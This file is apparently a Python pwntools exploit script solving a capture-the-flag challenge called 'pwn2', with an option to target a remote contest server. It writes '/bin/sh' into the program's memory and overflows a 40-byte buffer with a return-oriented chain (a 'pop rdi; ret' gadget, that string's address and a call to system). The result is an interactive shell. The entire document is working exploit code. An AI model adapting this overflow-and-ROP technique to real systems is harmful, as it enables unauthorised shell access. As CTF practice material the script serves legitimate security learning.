#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'pwn2')
rop = ROP(exe)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("challs.n00bzunit3d.xyz", 61223)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.sendlineafter(b'flag?', b'/bin/sh')

payload = b'A'*40
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(0x404090) # input address where we put /bin/sh
payload += p64(0x401280) # call system address

io.sendlineafter(b'flag?', payload)

io.interactive()

